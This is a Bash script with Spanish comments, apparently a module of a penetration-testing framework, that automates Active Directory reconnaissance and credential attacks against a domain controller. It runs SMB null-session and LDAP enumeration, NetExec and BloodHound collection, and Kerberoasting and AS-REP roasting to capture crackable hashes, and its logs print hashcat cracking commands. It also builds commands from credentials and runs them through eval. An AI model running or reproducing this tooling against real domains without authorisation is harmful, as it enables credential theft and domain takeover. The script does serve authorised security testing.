#!/usr/bin/env bash
# run-ad-enum.sh — Módulo de enumeración Active Directory
#
# Uso: bash run-ad-enum.sh <engagement_name> <dc_target> [opciones]
#
# Opciones:
#   --user <usuario>     Credencial de dominio (usuario)
#   --pass <password>    Credencial de dominio (password)
#   --hash <NT_hash>     Hash NTLM (pass-the-hash, alternativa a password)
#   --domain <domain>    Nombre del dominio (ej: corp.local)
#   --dc-ip <ip>         IP del Domain Controller (si no se resuelve por DNS)
#   --anon               Intentar enumeración anónima/null session primero
#   --bloodhound         Ejecutar BloodHound Python collector (requiere credenciales)
#   --kerberoast         Intentar Kerberoasting
#   --asreproast         Intentar AS-REP Roasting
#
# Requisitos: enum4linux-ng, ldapdomaindump, bloodhound-python (opcional),
#             impacket (GetUserSPNs, GetNPUsers), netexec (o crackmapexec)

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OFFSEC_HOME="${OFFSEC_HOME:-$(dirname "$SCRIPT_DIR")}"
DLP_SANITIZER="$OFFSEC_HOME/tools/sanitizer.py"

# ---------------------------------------------------------------------------
# Logging (consistente con auto-runner.sh)
# ---------------------------------------------------------------------------

LIVEFEED_DIR="$OFFSEC_HOME/logs/livefeed"
mkdir -p "$LIVEFEED_DIR"

ENGAGEMENT_DIR=""
LOG_FILE=""

log() {
    local PREFIX="$1"
    local MSG="$2"
    local TIMESTAMP
    TIMESTAMP=$(date +%H:%M:%S)
    local CLEAN_MSG
    if [ -n "$ENGAGEMENT_DIR" ] && command -v python3 &>/dev/null && [ -f "$DLP_SANITIZER" ]; then
        CLEAN_MSG=$(printf '%s' "$MSG" | python3 "$DLP_SANITIZER" "$ENGAGEMENT_DIR" 2>/dev/null || printf '%s' "$MSG")
    else
        CLEAN_MSG="$MSG"
    fi
    local LINE="[$TIMESTAMP][$PREFIX] $CLEAN_MSG"
    echo "$LINE"
    [ -n "$LOG_FILE" ] && echo "$LINE" >> "$LOG_FILE"
}

run_cmd() {
    local CMD="$1"
    local OUT_FILE="$2"
    log "START" "Ejecutando: $(printf '%s' "$CMD" | python3 "$DLP_SANITIZER" "$ENGAGEMENT_DIR" 2>/dev/null || echo "[cmd]")"
    if eval "$CMD" > "$OUT_FILE" 2>&1; then
        log "DONE" "OK → $(python3 "$DLP_SANITIZER" "$ENGAGEMENT_DIR" "$OUT_FILE" 2>/dev/null | wc -l) lineas"
    else
        log "SKIP" "Fallo (exit $?) — ver $OUT_FILE"
    fi
}

# ---------------------------------------------------------------------------
# Parse de argumentos
# ---------------------------------------------------------------------------

if [ $# -lt 2 ]; then
    echo "Uso: $0 <engagement> <dc_target> [--user u] [--pass p] [--domain d] [--dc-ip ip] [--anon] [--bloodhound] [--kerberoast] [--asreproast]"
    exit 1
fi

ENGAGEMENT_NAME="$1"
DC_TARGET="$2"
shift 2

AD_USER=""
AD_PASS=""
AD_HASH=""
AD_DOMAIN=""
DC_IP="$DC_TARGET"
DO_ANON=false
DO_BLOODHOUND=false
DO_KERBEROAST=false
DO_ASREPROAST=false

while [ $# -gt 0 ]; do
    case "$1" in
        --user)     AD_USER="$2";    shift 2 ;;
        --pass)     AD_PASS="$2";    shift 2 ;;
        --hash)     AD_HASH="$2";    shift 2 ;;
        --domain)   AD_DOMAIN="$2";  shift 2 ;;
        --dc-ip)    DC_IP="$2";      shift 2 ;;
        --anon)     DO_ANON=true;    shift ;;
        --bloodhound) DO_BLOODHOUND=true; shift ;;
        --kerberoast) DO_KERBEROAST=true; shift ;;
        --asreproast) DO_ASREPROAST=true; shift ;;
        *) echo "[WARN] Argumento desconocido: $1"; shift ;;
    esac
done
export AD_HASH  # reserved for pass-the-hash support (planned)

# ---------------------------------------------------------------------------
# Inicialización del engagement
# ---------------------------------------------------------------------------

ENGAGEMENT_DIR=$(find "$OFFSEC_HOME/findings" -maxdepth 1 -type d -name "????-??-??_${ENGAGEMENT_NAME}*" 2>/dev/null | sort | head -1)
if [ -z "$ENGAGEMENT_DIR" ]; then
    echo "[ERROR] Engagement no encontrado: $ENGAGEMENT_NAME"
    echo "  Ejecutar primero: /new-engagement $ENGAGEMENT_NAME"
    exit 1
fi

AD_DIR="$ENGAGEMENT_DIR/recon/ad"
mkdir -p "$AD_DIR"

DATE=$(date +%Y-%m-%d)
LOG_FILE="$LIVEFEED_DIR/${DATE}_${ENGAGEMENT_NAME}_ad.log"

log "PHASE" "=== MODULO AD — Active Directory Enumeration ==="
log "INFO" "Engagement: $ENGAGEMENT_NAME"

# Registrar DC en mapa DLP
if command -v python3 &>/dev/null && [ -f "$DLP_SANITIZER" ]; then
    DC_TOKEN=$(python3 "$DLP_SANITIZER" "$ENGAGEMENT_DIR" --register-ip "$DC_IP" 2>/dev/null || echo "$DC_IP")
    if [ -n "$AD_DOMAIN" ]; then
        python3 "$DLP_SANITIZER" "$ENGAGEMENT_DIR" --register-host "$AD_DOMAIN" > /dev/null 2>&1 || true
        DOM_TOKEN=$(python3 "$DLP_SANITIZER" "$ENGAGEMENT_DIR" <<< "$AD_DOMAIN" 2>/dev/null || echo "$AD_DOMAIN")
    else
        DOM_TOKEN="[dominio no especificado]"
    fi
else
    DC_TOKEN="$DC_IP"
    DOM_TOKEN="${AD_DOMAIN:-[dominio]}"
fi

log "INFO" "DC Target: $DC_TOKEN | Dominio: $DOM_TOKEN"

# ---------------------------------------------------------------------------
# FASE 1: Conectividad y puertos AD
# ---------------------------------------------------------------------------

log "PHASE" "--- Fase 1: Verificacion de conectividad AD ---"

PORTS_OUT="$AD_DIR/ports_ad.txt"
if command -v nmap &>/dev/null; then
    run_cmd "nmap -sV -p 88,135,139,389,445,464,593,636,3268,3269,5985 $DC_IP -oN $PORTS_OUT" "$PORTS_OUT"
    # Leer resultado sanitizado
    if [ -f "$PORTS_OUT" ] && command -v python3 &>/dev/null; then
        OPEN_PORTS=$(python3 "$DLP_SANITIZER" "$ENGAGEMENT_DIR" "$PORTS_OUT" 2>/dev/null | grep "open" | awk '{print $1}' | tr '\n' ' ')
        log "FIND" "Puertos AD abiertos: $OPEN_PORTS"
    fi
else
    log "SKIP" "nmap no disponible — saltando verificacion de puertos"
fi

# ---------------------------------------------------------------------------
# FASE 2: Enumeración SMB / NetBIOS (null session)
# ---------------------------------------------------------------------------

log "PHASE" "--- Fase 2: SMB / NetBIOS enumeration ---"

SMB_OUT="$AD_DIR/smb_enum.txt"
if command -v enum4linux-ng &>/dev/null; then
    if [ "$DO_ANON" = true ]; then
        run_cmd "enum4linux-ng -A $DC_IP" "$SMB_OUT"
    elif [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
        run_cmd "enum4linux-ng -A -u '$AD_USER' -p '$AD_PASS' $DC_IP" "$SMB_OUT"
    else
        run_cmd "enum4linux-ng -A $DC_IP" "$SMB_OUT"
    fi

    if [ -f "$SMB_OUT" ]; then
        USERS_FOUND=$(python3 "$DLP_SANITIZER" "$ENGAGEMENT_DIR" "$SMB_OUT" 2>/dev/null | grep -c "username:" || echo "0")
        SHARES_FOUND=$(python3 "$DLP_SANITIZER" "$ENGAGEMENT_DIR" "$SMB_OUT" 2>/dev/null | grep -c "Sharename" || echo "0")
        log "FIND" "SMB — Usuarios encontrados: ~$USERS_FOUND | Shares: ~$SHARES_FOUND"
    fi
elif command -v enum4linux &>/dev/null; then
    log "FIND" "enum4linux-ng no disponible, usando enum4linux clasico"
    run_cmd "enum4linux -a $DC_IP" "$SMB_OUT"
else
    log "SKIP" "enum4linux / enum4linux-ng no instalado"
fi

# ---------------------------------------------------------------------------
# FASE 3: LDAP Dump
# ---------------------------------------------------------------------------

log "PHASE" "--- Fase 3: LDAP Enumeration ---"

LDAP_DIR="$AD_DIR/ldap"
mkdir -p "$LDAP_DIR"

if command -v ldapdomaindump &>/dev/null && [ -n "$AD_USER" ] && [ -n "$AD_PASS" ] && [ -n "$AD_DOMAIN" ]; then
    LDAP_CMD="ldapdomaindump -u '${AD_DOMAIN}\\${AD_USER}' -p '$AD_PASS' ldap://$DC_IP -o $LDAP_DIR"
    log "START" "ldapdomaindump contra $DC_TOKEN"
    if eval "$LDAP_CMD" > "$LDAP_DIR/ldap_dump.log" 2>&1; then
        USERS_JSON="$LDAP_DIR/domain_users.json"
        if [ -f "$USERS_JSON" ]; then
            USER_COUNT=$(python3 -c "import json; d=json.load(open('$USERS_JSON')); print(len(d))" 2>/dev/null || echo "?")
            log "FIND" "LDAP — Usuarios de dominio: $USER_COUNT"
            # Registrar hostnames de usuarios en mapa DLP
            if command -v python3 &>/dev/null && [ -f "$DLP_SANITIZER" ]; then
                python3 "$DLP_SANITIZER" "$ENGAGEMENT_DIR" "$USERS_JSON" > /dev/null 2>&1 || true
            fi
        fi
        COMPUTERS_JSON="$LDAP_DIR/domain_computers.json"
        if [ -f "$COMPUTERS_JSON" ]; then
            COMP_COUNT=$(python3 -c "import json; d=json.load(open('$COMPUTERS_JSON')); print(len(d))" 2>/dev/null || echo "?")
            log "FIND" "LDAP — Equipos del dominio: $COMP_COUNT"
        fi
    else
        log "SKIP" "ldapdomaindump fallo — ver $LDAP_DIR/ldap_dump.log"
    fi
elif ! command -v ldapdomaindump &>/dev/null; then
    log "SKIP" "ldapdomaindump no instalado (pip install ldapdomaindump)"
else
    log "SKIP" "LDAP dump requiere --user, --pass y --domain"
fi

# ---------------------------------------------------------------------------
# FASE 4: CrackMapExec / NetExec — Reconocimiento inicial
# ---------------------------------------------------------------------------

log "PHASE" "--- Fase 4: CME / NetExec fingerprint ---"

CME_OUT="$AD_DIR/cme_smb.txt"
CME_BIN=""
if command -v netexec &>/dev/null; then
    CME_BIN="netexec"
elif command -v crackmapexec &>/dev/null; then
    CME_BIN="crackmapexec"
fi

if [ -n "$CME_BIN" ]; then
    if [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
        run_cmd "$CME_BIN smb $DC_IP -u '$AD_USER' -p '$AD_PASS' --shares --users 2>&1" "$CME_OUT"
    else
        run_cmd "$CME_BIN smb $DC_IP 2>&1" "$CME_OUT"
    fi
    if [ -f "$CME_OUT" ]; then
        SIGNING=$(python3 "$DLP_SANITIZER" "$ENGAGEMENT_DIR" "$CME_OUT" 2>/dev/null | grep -i "signing" | head -1 || true)
        log "FIND" "CME: $SIGNING"
    fi
else
    log "SKIP" "crackmapexec / netexec no instalado"
fi

# ---------------------------------------------------------------------------
# FASE 5: BloodHound Python Collection
# ---------------------------------------------------------------------------

if [ "$DO_BLOODHOUND" = true ]; then
    log "PHASE" "--- Fase 5: BloodHound Collection ---"

    BH_DIR="$AD_DIR/bloodhound"
    mkdir -p "$BH_DIR"

    if command -v bloodhound-python &>/dev/null && [ -n "$AD_USER" ] && [ -n "$AD_PASS" ] && [ -n "$AD_DOMAIN" ]; then
        BH_CMD="bloodhound-python -u '$AD_USER' -p '$AD_PASS' -d '$AD_DOMAIN' -dc $DC_IP -c All --zip -o $BH_DIR"
        log "START" "BloodHound collection — dominio $DOM_TOKEN"
        if eval "$BH_CMD" > "$BH_DIR/bh_run.log" 2>&1; then
            BH_ZIP=$(find "$BH_DIR" -maxdepth 1 -name "*.zip" 2>/dev/null | head -1)
            if [ -n "$BH_ZIP" ]; then
                log "FIND" "BloodHound ZIP generado: $(basename "$BH_ZIP")"
                log "THINK" "Importar ZIP en BloodHound GUI para visualizar attack paths"
                log "THINK" "Queries utiles: Shortest path to DA, Kerberoastable users, ACL abuse"
            fi
        else
            log "SKIP" "BloodHound collection fallo — ver $BH_DIR/bh_run.log"
        fi
    elif ! command -v bloodhound-python &>/dev/null; then
        log "SKIP" "bloodhound-python no instalado (pip install bloodhound)"
    else
        log "SKIP" "BloodHound requiere --user, --pass y --domain"
    fi
fi

# ---------------------------------------------------------------------------
# FASE 6: Kerberoasting
# ---------------------------------------------------------------------------

if [ "$DO_KERBEROAST" = true ]; then
    log "PHASE" "--- Fase 6: Kerberoasting ---"

    KERB_OUT="$AD_DIR/kerberoast_hashes.txt"

    if command -v GetUserSPNs.py &>/dev/null && [ -n "$AD_USER" ] && [ -n "$AD_PASS" ] && [ -n "$AD_DOMAIN" ]; then
        run_cmd "GetUserSPNs.py '${AD_DOMAIN}/${AD_USER}:${AD_PASS}' -dc-ip $DC_IP -request" "$KERB_OUT"
        if [ -f "$KERB_OUT" ]; then
            # shellcheck disable=SC2016  # literal $ in grep regex, not shell expansion
            HASH_COUNT=$(grep -c '^\$krb5tgs\$' "$KERB_OUT" 2>/dev/null || echo "0")
            if [ "$HASH_COUNT" -gt 0 ]; then
                log "CRIT" "Kerberoasting — $HASH_COUNT hash(es) TGS capturados"
                log "THINK" "Crackear con: hashcat -m 13100 $KERB_OUT /usr/share/wordlists/rockyou.txt"
            else
                log "INFO" "Kerberoasting — sin cuentas con SPN (o sin permisos)"
            fi
        fi
    elif ! command -v GetUserSPNs.py &>/dev/null; then
        log "SKIP" "GetUserSPNs.py no disponible (instalar impacket)"
    else
        log "SKIP" "Kerberoasting requiere --user, --pass y --domain"
    fi
fi

# ---------------------------------------------------------------------------
# FASE 7: AS-REP Roasting
# ---------------------------------------------------------------------------

if [ "$DO_ASREPROAST" = true ]; then
    log "PHASE" "--- Fase 7: AS-REP Roasting ---"

    ASREP_OUT="$AD_DIR/asreproast_hashes.txt"
    USERS_FILE="$AD_DIR/users_list.txt"

    # Generar lista de usuarios desde enum4linux output si existe
    if [ -f "$SMB_OUT" ]; then
        grep "username:" "$SMB_OUT" 2>/dev/null | awk -F: '{print $2}' | tr -d ' ' > "$USERS_FILE" || true
    fi

    if command -v GetNPUsers.py &>/dev/null; then
        if [ -f "$USERS_FILE" ] && [ -s "$USERS_FILE" ]; then
            run_cmd "GetNPUsers.py '$AD_DOMAIN/' -usersfile '$USERS_FILE' -dc-ip $DC_IP -format hashcat -outputfile $ASREP_OUT" "$ASREP_OUT"
        elif [ -n "$AD_USER" ] && [ -n "$AD_PASS" ] && [ -n "$AD_DOMAIN" ]; then
            run_cmd "GetNPUsers.py '${AD_DOMAIN}/${AD_USER}:${AD_PASS}' -dc-ip $DC_IP -format hashcat -outputfile $ASREP_OUT -request" "$ASREP_OUT"
        else
            log "SKIP" "AS-REP Roasting requiere lista de usuarios o credenciales"
        fi

        if [ -f "$ASREP_OUT" ] && [ -s "$ASREP_OUT" ]; then
            # shellcheck disable=SC2016  # literal $ in grep regex, not shell expansion
            HASH_COUNT=$(grep -c '^\$krb5asrep\$' "$ASREP_OUT" 2>/dev/null || echo "0")
            if [ "$HASH_COUNT" -gt 0 ]; then
                log "CRIT" "AS-REP Roasting — $HASH_COUNT cuenta(s) sin preauth"
                log "THINK" "Crackear con: hashcat -m 18200 $ASREP_OUT /usr/share/wordlists/rockyou.txt"
            else
                log "INFO" "AS-REP Roasting — sin cuentas vulnerables encontradas"
            fi
        fi
    else
        log "SKIP" "GetNPUsers.py no disponible (instalar impacket)"
    fi
fi

# ---------------------------------------------------------------------------
# RESUMEN
# ---------------------------------------------------------------------------

log "PHASE" "=== RESUMEN AD ENUM ==="
log "SUM" "Engagement: $ENGAGEMENT_NAME"
log "SUM" "DC: $DC_TOKEN | Dominio: $DOM_TOKEN"
log "SUM" "Archivos generados en: $AD_DIR/"

# Contar hallazgos críticos
CRIT_COUNT=$(grep -c "\[CRIT\]" "$LOG_FILE" 2>/dev/null || echo "0")
FIND_COUNT=$(grep -c "\[FIND\]" "$LOG_FILE" 2>/dev/null || echo "0")

log "SUM" "Hallazgos totales: $FIND_COUNT | Criticos: $CRIT_COUNT"

if [ "$CRIT_COUNT" -gt 0 ]; then
    log "CRIT" "HAY $CRIT_COUNT HALLAZGOS CRITICOS — revisar log completo"
fi

log "SUM" "Siguiente paso: /ad-enum $ENGAGEMENT_NAME --findings para generar finding_*.md"
log "SUM" "Live feed completo: $LOG_FILE"
